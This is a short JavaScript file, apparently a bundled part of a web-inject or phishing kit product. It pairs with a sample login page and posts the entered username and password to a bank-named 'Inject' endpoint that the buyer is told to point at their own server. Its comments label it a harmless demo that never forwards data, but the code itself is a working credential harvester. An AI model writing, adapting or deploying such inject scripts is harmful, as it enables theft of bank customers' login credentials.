/* 示例注入页脚本（本产品自带，可自由修改）
 * 与 materials/inject/sample_login.html 配套：把校验按钮接到你的接口。
 * 注意：本文件不含任何第三方品牌与素材。
 */
(function () {
  var cfg = {
    api: '/api/EaodBankInject.php',   // 提交接口（示例：服务端只回执，不转发）
    flow: 'demo',                     // 流程标识
    lang: 'zh-CN',
    mode: 'demo'
  };
  function q(id) { return document.getElementById(id); }
  function submit() {
    var u = (q('u') || {}).value || '';
    var p = (q('p') || {}).value || '';
    fetch(cfg.api, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ u: u, p: p, flow: cfg.flow })
    }).catch(function () { /* 示例：失败也不外发 */ });
  }
  window.__DEMO_CONFIG = cfg;
  window.submitDemo = submit;
})();
